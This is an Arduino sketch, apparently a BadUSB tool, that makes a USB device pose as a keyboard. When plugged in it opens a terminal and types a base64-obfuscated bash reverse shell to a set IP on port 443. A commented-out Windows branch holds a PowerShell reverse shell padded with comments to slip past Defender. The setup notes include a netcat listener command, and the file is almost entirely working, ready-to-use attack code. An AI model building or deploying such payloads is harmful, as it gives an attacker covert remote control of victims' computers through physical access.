/*
  ============================================================
   Reverse Shell Injector via HID Keyboard
  ============================================================

  Board Setting:
    Tools > USB Type > Keyboard

  Description:
    Launches a terminal, and sends a bash reverse shell payload
    to a listening host/port.

  Notes:
    Open the port on your machine using `nc -lvnp 443`.
    Enable the desired target operating system.

  To Do:
    - Include Windows support
      - hide powershell
      - encode payload

  Author: NenshaM
  License: GPL v3
  Version: 1.2.0
  ============================================================
*/

#include <Keyboard.h>
#include <Base64.h>

// ================= USER CONFIGURATION =================

// Enable Serial debug output
const bool DEBUG_MODE = true;

// Reverse shell target
#define OS_LINUX
// #define OS_WINDOWS
#define IP_ADDR  "192.168.1.191"
#define PORT_NUM "443" // use 443 to bypass firewall


// ================= LINUX COMMANDS =================
#ifdef OS_LINUX

// Key combo to open GNOME run dialog
const int OPEN_RUN_KEYS[] = {
  KEY_LEFT_ALT,
  KEY_F2
};

// Command to launch GNOME terminal
const char TERMINAL_CMD[] = "gnome-terminal";

// BASH reverse shell payload
char* create_payload(void) {
  char clearPayload[] = "bash -i >& /dev/tcp/" IP_ADDR "/" PORT_NUM " 0>&1 &";

  int clearPayloadLength = strlen(clearPayload);
  int encodedLength = Base64.encodedLength(clearPayloadLength);
  int payloadLength = strlen("nohup bash -c \"$(echo '") + encodedLength + strlen("' | base64 --decode)\"; exit") + 1;

  // Dynamically allocate memory for the encoded string + "| base64 --decode"
  char* payload = new char[payloadLength];
  strcpy(payload, "nohup bash -c \"$(echo '");

  // Encode the input string
  Base64.encode(payload + strlen("nohup bash -c \"$(echo '"), clearPayload, clearPayloadLength);

  // Append "| base64 --decode" to the encoded string
  strcat(payload, "' | base64 --decode)\"; exit");

  if (DEBUG_MODE) {
    Serial.print("Payload: ");
    Serial.println(payload);
  }

  return payload;
}

#endif

// ================= WINDOS COMMANDS =================
#ifdef OS_WINDOWS

// Key combo to open run dialog
const int OPEN_RUN_KEYS[] = {
  KEY_LEFT_GUI,
  'r'
};

// Command to launch powershell
const char TERMINAL_CMD[] = "powershell";

// Powershell reverse shell payload !!! Currently blocked by defender
char* create_payload(void) {
  static char clearPayload[] = "$client = New-Object System.Net.Sockets.TCPClient('" IP_ADDR "'," PORT_NUM ");\n"
    "$stream = $client.GetStream();\n"
    "[byte[]]$bytes = 0..65535|%{0};\n"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n"
      "$data = <# Some Fancy Comment#> (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) <# Some Fancy Comment#> ;\n"
      "$sendback = <# Some Fancy Comment#> (iex $data 2>&1 | Out-String ) <# Some Fancy Comment#> ;\n"
      "$sendback2 = <# Some Fancy Comment#> $sendback + 'PS ' + (pwd).Path + '> ' <# Some Fancy Comment#> ;\n"
      "$sendbyte = <# Some Fancy Comment#> ([text.encoding]::ASCII).GetBytes($sendback2) <# Some Fancy Comment#> ;\n"
      "$stream.Write($sendbyte,0,$sendbyte.Length) <# Some Fancy Comment#> ;\n"
      "$stream.Flush()\n"
      "};\n"
    "$client.Close()";

  // try:
  // # Suppose your Base64 payload is in $PAYLOAD
  // powershell.exe -NoProfile -EncodedCommand $PAYLOAD

  // int clearPayloadLength = strlen(clearPayload);
  // // int encodedLength = Base64.encodedLength(clearPayloadLength);

  // // Dynamically allocate memory for the encoded string + "| base64 --decode"
  // char* payload = new char[clearPayloadLength+1];
  // strcpy(payload, clearPayload);

  return clearPayload;
}
#endif

// ================= HELPER FUNCTIONS =================

/*
 * Press a key with delay.
 */
void pressKey(int key) {
  Keyboard.press(key);

  if (DEBUG_MODE) {
    Serial.print("Pressed key: ");
    Serial.println(key);
  }

  delay(random(250, 750));
}

/*
 * Type a string then hit "Enter".
 */
void typeCommand(const char *cmd) {
  Keyboard.print(cmd);

  if (DEBUG_MODE) {
    Serial.print("Typed command: ");
    Serial.println(cmd);
  }

  delay(random(250, 750));
  Keyboard.press(KEY_ENTER);
  delay(random(25, 75));
  Keyboard.release(KEY_ENTER);
}

// ================= SETUP =================

void setup() {

  // Initialize Serial for debugging
  if (DEBUG_MODE) {
    Serial.begin(115200);
    delay(1000);
    Serial.println("Reverse Shell Injector Started");
  }

  // Seed random generator using floating analog pin
  randomSeed(analogRead(0));

  Keyboard.begin();
  delay(random(750, 1250)); // let the host recognize the keyboard

  // Open run dialog
  for (size_t i = 0; i < (sizeof(OPEN_RUN_KEYS) / sizeof(OPEN_RUN_KEYS[0])); i++) {
    pressKey(OPEN_RUN_KEYS[i]);
  }
  Keyboard.releaseAll();

  // Launch terminal
  delay(random(250, 750));
  typeCommand(TERMINAL_CMD);

  // Execute reverse shell payload
  delay(random(750, 1250));
  typeCommand(create_payload());

  Keyboard.end();
}

void loop() {
  // no repeated action
}